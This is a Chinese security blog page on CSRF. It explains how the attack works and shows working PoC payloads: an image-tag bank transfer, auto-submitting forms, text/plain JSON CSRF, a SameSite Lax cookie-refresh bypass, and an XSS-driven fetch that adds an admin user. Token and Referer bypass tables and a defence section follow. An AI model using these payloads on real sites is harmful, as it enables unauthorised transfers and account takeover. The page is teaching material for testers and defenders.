@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    
+
+    
+<script>!function(){var e=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,t=localStorage.getItem("use-color-scheme")||"auto";("dark"===t||e&&"light"!==t)&&document.documentElement.classList.toggle("dark",!0)}()</script>
+    
+
+<meta charset="utf-8" >
+
+<title>CSRF 跨站请求伪造</title>
+<meta name="keywords" content="CSRF 跨站请求伪造, 安全,渗透测试,应急响应,漏洞分析,安全运维">
+<meta name="description" content="
+一、基本原理1.1 是什么CSRF（Cross-Site Request Forgery，跨站请求伪造），也叫 One Click Attack 或 Session Riding。一句话：攻击者诱导受害者访问恶意页面，浏览器以受害者的身份">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta property="og:title" content="CSRF 跨站请求伪造">
+<meta property="og:description" content="
+一、基本原理1.1 是什么CSRF（Cross-Site Request Forgery，跨站请求伪造），也叫 One Click Attack 或 Session Riding。一句话：攻击者诱导受害者访问恶意页面，浏览器以受害者的身份">
+
+<link rel="shortcut icon" href="/favicon.ico">
+<link rel="stylesheet" href="/style/main.css">
+
+  <link rel="stylesheet" href="/style/simple-lightbox.min.css"><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="54ury" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="54ury" type="application/rss+xml">
+</head>
+  <body>
+    <div id="app" class="main">
+
+<div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      
+      
+      <a href="https://z50n6.github.io" class="no-avatar">
+        <h1 class="site-title">54ury</h1>
+      </a>
+    </div>
+    <div class="right">
+        
+        <button type="button" class="theme-switch" id="theme-switch" aria-label="切换亮色/暗色主题" title="切换主题">
+          <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true">
+            <circle cx="12" cy="12" r="4"></circle>
+            <path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"></path>
+          </svg>
+          <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"></path>
+          </svg>
+        </button>
+        <i class="icon menu-switch icon-menu-outline" ></i>
+    </div>
+  </div>
+</div>
+
+<script>
+  // 手动切换亮/暗：写入 html.dark 并记忆到 use-color-scheme（与 head.ejs 的读取键一致）
+  (function () {
+    var btn = document.getElementById('theme-switch');
+    if (!btn) return;
+    btn.addEventListener('click', function () {
+      var isDark = document.documentElement.classList.toggle('dark');
+      try { localStorage.setItem('use-color-scheme', isDark ? 'dark' : 'light'); } catch (e) {}
+    });
+  })();
+</script>
+
+<div class="menu-container" style="height: 0;opacity: 0;">
+<nav class="menu-list">
+  
+    
+      <a href="/" class="menu purple-link">
+        首页
+      </a>
+    
+  
+    
+      <a href="/tags/" class="menu purple-link">
+        标签
+      </a>
+    
+  
+    
+      <a href="/categories/" class="menu purple-link">
+        分类
+      </a>
+    
+  
+    
+      <a href="/archives/" class="menu purple-link">
+        归档
+      </a>
+    
+  
+    
+      <a href="/about/" class="menu purple-link">
+        关于
+      </a>
+    
+  
+</nav>
+</div>
+
+
+
+  <div class="content-container">
+    <div class="post-detail">
+      
+      <h2 class="post-title">CSRF 跨站请求伪造</h2>
+      <div class="post-info post-detail-info">
+        <span><i class="icon icon-calendar-outline"></i> 2026-06-28</span>
+        
+          <span>
+          <i class="icon icon-pricetags-outline"></i>
+            
+              <a href="/tags/WEB%E6%B8%97%E9%80%8F/">
+              WEB渗透
+                
+                  ，
+                
+              </a>
+            
+              <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">
+              基础漏洞
+                
+              </a>
+            
+          </span>
+        
+      </div>
+      <div class="post-content-wrapper">
+        <div class="post-content">
+          <hr>
+<h2 id="一、基本原理"><a href="#一、基本原理" class="headerlink" title="一、基本原理"></a>一、基本原理</h2><h3 id="1-1-是什么"><a href="#1-1-是什么" class="headerlink" title="1.1 是什么"></a>1.1 是什么</h3><p>CSRF（Cross-Site Request Forgery，跨站请求伪造），也叫 One Click Attack 或 Session Riding。一句话：<strong>攻击者诱导受害者访问恶意页面，浏览器以受害者的身份向目标网站发了一个请求，干了受害者不想干的事。</strong></p>
+<p>和 XSS 的本质区别：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>CSRF</th>
+<th>XSS</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>攻击方式</td>
+<td>借用户的权限发起请求，攻击者自己没拿到权限</td>
+<td>直接盗取用户的权限或 Cookie</td>
+</tr>
+<tr>
+<td>脚本注入</td>
+<td>不需要往目标站注入 JS</td>
+<td>需要把恶意脚本注入目标站页面</td>
+</tr>
+<tr>
+<td>攻击者能看到响应</td>
+<td>❌ 看不到</td>
+<td>✅ 能通过 JS 读取</td>
+</tr>
+</tbody></table>
+<p>打个比方：XSS 是偷了你的钥匙进你家门；CSRF 是骗你自己开门——攻击者根本不需要知道钥匙长什么样。</p>
+<h3 id="1-2-攻击前提"><a href="#1-2-攻击前提" class="headerlink" title="1.2 攻击前提"></a>1.2 攻击前提</h3><p>两个条件缺一不可：</p>
+<ol>
+<li>受害者已登录目标网站，session 未过期</li>
+<li>受害者访问了攻击者构造的恶意页面或链接</li>
+</ol>
+<h3 id="1-3-黑盒如何判断"><a href="#1-3-黑盒如何判断" class="headerlink" title="1.3 黑盒如何判断"></a>1.3 黑盒如何判断</h3><p>抓包看三个东西：</p>
+<ol>
+<li>有没有验证请求来源（<code>Referer</code> &#x2F; <code>Origin</code> &#x2F; <code>Sec-Fetch-Site</code>）</li>
+<li>有没有 CSRF Token</li>
+<li>关键操作有没有二次验证（密码、验证码）</li>
+</ol>
+<hr>
+<h2 id="二、攻击场景与-PoC"><a href="#二、攻击场景与-PoC" class="headerlink" title="二、攻击场景与 PoC"></a>二、攻击场景与 PoC</h2><h3 id="2-1-GET-方式"><a href="#2-1-GET-方式" class="headerlink" title="2.1 GET 方式"></a>2.1 GET 方式</h3><p>假设银行转账接口是 <code>GET /transfer?to=hacker&amp;amount=10000</code>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 一张图就能打 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://bank.com/transfer.php?to=hacker&amp;amount=10000&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>浏览器加载 <code>&lt;img&gt;</code> 时自动带上 Cookie，转账在受害者毫不知情下完成。</p>
+<p><a class="simple-lightbox" href="/imgs/csrf/image-20230828193451895.png"><img   src="/images/loading.svg" data-src="/imgs/csrf/image-20230828193451895.png"  alt="GET CSRF 攻击场景模型" lazyload></a></p>
+<h3 id="2-2-POST-方式"><a href="#2-2-POST-方式" class="headerlink" title="2.2 POST 方式"></a>2.2 POST 方式</h3><p>改 POST 就能防住？直接构造自动提交表单：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&#x27;utf-8&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&#x27;csrf&#x27;</span> <span class="attr">action</span>=<span class="string">&#x27;http://bank.com/transfer.php&#x27;</span> <span class="attr">method</span>=<span class="string">&#x27;post&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;hidden&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;to&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;hacker&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;hidden&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;amount&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;10000&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">csrf</span>.<span class="title function_">submit</span>()</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./beauty.jpg&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 诱导链接 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;javascript:document.csrf.submit()&#x27;</span>&gt;</span>速来领钱<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>用户打开页面 → 表单自动 POST → Cookie 照样带上。</p>
+<h3 id="2-3-JSON-CSRF"><a href="#2-3-JSON-CSRF" class="headerlink" title="2.3 JSON CSRF"></a>2.3 JSON CSRF</h3><p>前后端分离常用的 <code>Content-Type: application/json</code> 接口，如果服务端没有严格校验 Content-Type：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- text/plain 绕过 Content-Type 检查 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://api.target.com/update&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">enctype</span>=<span class="string">&quot;text/plain&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&#x27;&#123;&quot;name&quot;:&quot;hacked&quot;&#125;&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>()</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>CORS 配置不当还能直接 <code>fetch</code>：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://api.target.com/update&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123; <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span> &#125;,</span><br><span class="line">  <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">name</span>: <span class="string">&#x27;hacked&#x27;</span> &#125;)</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 如果服务端返回 Access-Control-Allow-Origin: evil.com</span></span><br><span class="line"><span class="comment">// 且 Access-Control-Allow-Credentials: true → Cookie 就带上了</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="三、CSRF-Token-绕过"><a href="#三、CSRF-Token-绕过" class="headerlink" title="三、CSRF Token 绕过"></a>三、CSRF Token 绕过</h2><p>Token 是最主流的 CSRF 防护，但实现不好形同虚设：</p>
+<table>
+<thead>
+<tr>
+<th>绕过手法</th>
+<th>原理</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>直接删掉 Token</strong></td>
+<td>服务端只在 Token 存在时校验，删了跳过</td>
+</tr>
+<tr>
+<td><strong>全局 Token 复用</strong></td>
+<td>全站共用一个 Token，用自己账号的 Token 打受害者</td>
+</tr>
+<tr>
+<td><strong>Token 未绑定 Session</strong></td>
+<td>换个 Cookie，Token 还能用，用户间可互换</td>
+</tr>
+<tr>
+<td><strong>Cookie Tossing（Cookie 投毒）</strong></td>
+<td>从同站子域名设一个同名 CSRF Cookie，覆盖受害者的</td>
+</tr>
+<tr>
+<td><strong>CORS 泄露</strong></td>
+<td>CORS 配错 → 跨域 JS 读到页面里的 Token</td>
+</tr>
+<tr>
+<td><strong>Token 不过期</strong></td>
+<td>生成后永不刷新，拿到一次用一辈子</td>
+</tr>
+</tbody></table>
+<h3 id="Cookie-Tossing-攻击链"><a href="#Cookie-Tossing-攻击链" class="headerlink" title="Cookie Tossing 攻击链"></a>Cookie Tossing 攻击链</h3><p>Double-submit cookie 模式的死穴：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 攻击者在 sub.target.com 先设一个 _csrf=known_value 的 Cookie</span><br><span class="line">2. 受害者访问攻击者页面 → 浏览器发起对 main.target.com 的请求</span><br><span class="line">3. 浏览器同时携带：攻击者设的 _csrf Cookie + 受害者自己的 session Cookie</span><br><span class="line">4. 服务端校验：请求体 csrf_token == Cookie._csrf → 一致 → 放行</span><br><span class="line">5. 攻击成功，因为 Token 是攻击者预先设置的</span><br></pre></td></tr></table></figure>
+
+<p><strong>根因</strong>：浏览器不区分 Cookie 是哪个子域名设的，到主站全部混在一起。</p>
+<hr>
+<h2 id="四、SameSite-Cookie-绕过"><a href="#四、SameSite-Cookie-绕过" class="headerlink" title="四、SameSite Cookie 绕过"></a>四、SameSite Cookie 绕过</h2><p>SameSite 是浏览器从 Chrome 80+ 开始强推的 CSRF 防护，控制 Cookie 在跨站请求中是否发送：</p>
+<table>
+<thead>
+<tr>
+<th>属性</th>
+<th>跨站请求是否携带 Cookie</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>None</code></td>
+<td>✅ 始终携带（必须配 <code>Secure</code>）</td>
+</tr>
+<tr>
+<td><code>Lax</code>（Chrome 默认）</td>
+<td>仅 GET + 顶级导航；POST &#x2F; iframe &#x2F; img &#x2F; script 不携带</td>
+</tr>
+<tr>
+<td><code>Strict</code></td>
+<td>❌ 完全不携带</td>
+</tr>
+</tbody></table>
+<h3 id="4-1-None-—-直接打"><a href="#4-1-None-—-直接打" class="headerlink" title="4.1 None — 直接打"></a>4.1 None — 直接打</h3><p>Cookie 被显式标为 <code>SameSite=None; Secure</code>，开发者主动关掉了防护。传统 CSRF 怎么打就怎么打。</p>
+<h3 id="4-2-Lax-绕过"><a href="#4-2-Lax-绕过" class="headerlink" title="4.2 Lax 绕过"></a>4.2 Lax 绕过</h3><p><strong>手法一：GET 方法重载</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://target.com/transfer&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;_method&quot;</span> <span class="attr">value</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;10000&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>()</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Symfony、Laravel 等框架支持 <code>_method</code> 参数覆写 HTTP 方法——GET 到后端变 POST，绕过 Lax 对 POST 的限制。</p>
+<p><strong>手法二：Cookie 刷新攻击（120 秒窗口）</strong></p>
+<p>Chrome 对未显式设 SameSite 的默认 Lax Cookie，在前 2 分钟内顶级 POST 也会携带：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">action</span>=<span class="string">&quot;https://target.com/change-email&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;attacker@evil.com&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">onclick</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 触发 SSO 登录刷新 session cookie</span></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;https://target.com/social-login&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 等几秒，新 Cookie 在 120s 窗口内</span></span></span><br><span class="line"><span class="language-javascript">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>(), <span class="number">5000</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-3-Strict-绕过"><a href="#4-3-Strict-绕过" class="headerlink" title="4.3 Strict 绕过"></a>4.3 Strict 绕过</h3><p>Strict 是最强的，但”同站”定义有隙可乘：</p>
+<p><strong>手法一：子域名漏洞链</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sub.target.com（存在 XSS 或被接管）</span><br><span class="line">         ↓ 同站请求，Strict Cookie 照带不误</span><br><span class="line">main.target.com</span><br></pre></td></tr></table></figure>
+
+<p>子域名只要有一个能执行 JS 的点，Strict 就没用了。</p>
+<p><strong>手法二：客户端重定向 Gadget</strong></p>
+<p>利用目标站内的 DOM-based redirect 做跳板——请求从站内 JS 发起，Strict Cookie 自然被携带。</p>
+<p><strong>手法三：User-Agent 差异</strong></p>
+<p>桌面版 Strict，移动版 None——诱导受害者用手机打开恶意页面即可绕过。</p>
+<hr>
+<h2 id="五、Referer-Origin-校验绕过"><a href="#五、Referer-Origin-校验绕过" class="headerlink" title="五、Referer &#x2F; Origin 校验绕过"></a>五、Referer &#x2F; Origin 校验绕过</h2><table>
+<thead>
+<tr>
+<th>绕过方式</th>
+<th>原理</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>删除 Referer</strong></td>
+<td><code>&lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt;</code> 让浏览器不发 Referer，服务端看到空值直接放行</td>
+</tr>
+<tr>
+<td><strong>宽松匹配</strong></td>
+<td>服务端只检查 Referer 是否”包含”目标域名 → <code>evil.com/target.com</code> 通过</td>
+</tr>
+<tr>
+<td><strong>Origin: null</strong></td>
+<td>sandbox iframe &#x2F; <code>data:</code> URL &#x2F; 跨源重定向链产生 null Origin，服务端没区分</td>
+</tr>
+<tr>
+<td><strong>子域名伪造</strong></td>
+<td>在子域名部署同名 Referer 检查的支持页面</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="六、验证工具"><a href="#六、验证工具" class="headerlink" title="六、验证工具"></a>六、验证工具</h2><h3 id="Burp-Suite-→-CSRF-PoC"><a href="#Burp-Suite-→-CSRF-PoC" class="headerlink" title="Burp Suite → CSRF PoC"></a>Burp Suite → CSRF PoC</h3><p>复制请求 → 右键 → Engagement tools → Generate CSRF PoC → 自动生成 HTML 表单，可选自动提交脚本。浏览器打开即测。</p>
+<p><a class="simple-lightbox" href="/imgs/csrf/image-20230828193907618.png"><img   src="/images/loading.svg" data-src="/imgs/csrf/image-20230828193907618.png"  alt="Burp PoC Generator" lazyload></a><br><a class="simple-lightbox" href="/imgs/csrf/image-20230828193927900.png"><img   src="/images/loading.svg" data-src="/imgs/csrf/image-20230828193927900.png"  alt="Burp 修改密码测试" lazyload></a></p>
+<h3 id="CSRFTester"><a href="#CSRFTester" class="headerlink" title="CSRFTester"></a>CSRFTester</h3><p>老牌 CSRF 测试工具，代理端口 8008，浏览器挂代理后自动记录请求 → 生成 PoC。</p>
+<h3 id="手动-curl"><a href="#手动-curl" class="headerlink" title="手动 curl"></a>手动 curl</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 无 Referer 请求</span></span><br><span class="line">curl -X POST https://target.com/api/action \</span><br><span class="line">  -d <span class="string">&quot;param=value&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Cookie: session=xxx&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 伪造 Referer</span></span><br><span class="line">curl -X POST https://target.com/api/action \</span><br><span class="line">  -d <span class="string">&quot;param=value&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Referer: https://evil.com&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Cookie: session=xxx&quot;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="七、XSS-CSRF-组合拳"><a href="#七、XSS-CSRF-组合拳" class="headerlink" title="七、XSS + CSRF 组合拳"></a>七、XSS + CSRF 组合拳</h2><p>单独 CSRF 只能改状态、拿不到响应。但配上 XSS——SameSite 的一切限制都不存在了，因为是同源请求：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// XSS 注入后在同源下用 fetch 发 CSRF</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/admin/user.action.php&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123; <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span> &#125;,</span><br><span class="line">  <span class="attr">body</span>: <span class="string">&#x27;act=add&amp;username=hacker&amp;password=12345&amp;button=添加用户&amp;userid=0&#x27;</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>实战链路：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">留言板注入 XSS → 管理员浏览 → JS 以管理员身份添加后台用户 </span><br><span class="line">→ 攻击者用自己设的账号登录后台 → 提权完成</span><br></pre></td></tr></table></figure>
+
+<p><a class="simple-lightbox" href="/imgs/csrf/image-20230828194145276.png"><img   src="/images/loading.svg" data-src="/imgs/csrf/image-20230828194145276.png"  alt="XSS+CSRF 攻击流程" lazyload></a><br><a class="simple-lightbox" href="/imgs/csrf/image-20230828194553391.png"><img   src="/images/loading.svg" data-src="/imgs/csrf/image-20230828194553391.png"  alt="管理员后台被添加用户" lazyload></a></p>
+<hr>
+<h2 id="八、防御"><a href="#八、防御" class="headerlink" title="八、防御"></a>八、防御</h2><h3 id="无效防御（别踩坑）"><a href="#无效防御（别踩坑）" class="headerlink" title="无效防御（别踩坑）"></a>无效防御（别踩坑）</h3><table>
+<thead>
+<tr>
+<th>误区</th>
+<th>原因</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>仅接受 POST</td>
+<td>攻击者能构造自动提交的表单</td>
+</tr>
+<tr>
+<td>多步操作</td>
+<td>攻击者可逐步预测和自动填充</td>
+</tr>
+<tr>
+<td>HTTPS</td>
+<td>传输层加密，跟 CSRF 无关</td>
+</tr>
+<tr>
+<td>URL 重写 Session</td>
+<td>Session 暴露在 URL 里，故障比 CSRF 还大</td>
+</tr>
+<tr>
+<td>私密 Cookie 名</td>
+<td>Cookie 是浏览器自动发的，字段名不重要</td>
+</tr>
+</tbody></table>
+<h3 id="有效防御"><a href="#有效防御" class="headerlink" title="有效防御"></a>有效防御</h3><table>
+<thead>
+<tr>
+<th>措施</th>
+<th>要点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>CSRF Token</strong></td>
+<td>随机、绑定 Session、一次性、不在 Cookie 里存</td>
+</tr>
+<tr>
+<td><strong>SameSite Cookie</strong></td>
+<td><code>Strict</code> 或 <code>Lax</code>，浏览器层面拦截跨站 Cookie</td>
+</tr>
+<tr>
+<td><strong>验证 Origin + Referer</strong></td>
+<td>严格比对 + 缺失时直接拒绝，不做模糊匹配</td>
+</tr>
+<tr>
+<td><strong>二次验证</strong></td>
+<td>关键操作强制输入密码或验证码</td>
+</tr>
+<tr>
+<td><strong>HttpOnly</strong></td>
+<td>禁止 JS 读 Cookie，切断 XSS → CSRF 链</td>
+</tr>
+<tr>
+<td><strong>Sec-Fetch-Site</strong></td>
+<td>现代浏览器默认带这个头，<code>cross-site</code> 直接拦截</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="九、案例参考"><a href="#九、案例参考" class="headerlink" title="九、案例参考"></a>九、案例参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/rayob1/p/16093230.html">Z_BlogCMS 同源策略 — Referer 校验绕过</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/ZhaoSong_/article/details/132326347">DVWA CSRF 靶场练习</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/ZhaoSong_/article/details/132358623">Pikachu CSRF 靶场练习</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh">PortSwigger — SameSite Lax bypass via cookie refresh</a></li>
+<li><a target="_blank" rel="noopener" href="https://undercodetesting.com/bypassing-samesite-cookies-the-ultimate-csrf-execution-guide-for-2025-video/">Bypassing SameSite Cookies: Execution Guide For 2025</a></li>
+<li><a target="_blank" rel="noopener" href="https://systemweakness.com/csrf-is-still-alive-a-modern-guide-for-hackers-and-defenders-2f142232e5ba">CSRF Is Still Alive — A Modern Guide (2024)</a></li>
+</ul>
+<hr>
+<blockquote>
+<p>CSRF 打的是浏览器自动带 Cookie 的机制。防御的核心就是让服务端能区分”用户本意点的请求”和”别处偷偷发来的请求”——Token、SameSite、Referer 三层卡位，缺一层就少一道防线。</p>
+</blockquote>
+
+        </div>
+          
+        <div class="top-div">
+          <ol class="top-box"><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%B8%80%E3%80%81%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="top-box-text">一、基本原理</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#1-1-%E6%98%AF%E4%BB%80%E4%B9%88"><span class="top-box-text">1.1 是什么</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#1-2-%E6%94%BB%E5%87%BB%E5%89%8D%E6%8F%90"><span class="top-box-text">1.2 攻击前提</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#1-3-%E9%BB%91%E7%9B%92%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD"><span class="top-box-text">1.3 黑盒如何判断</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%BA%8C%E3%80%81%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF%E4%B8%8E-PoC"><span 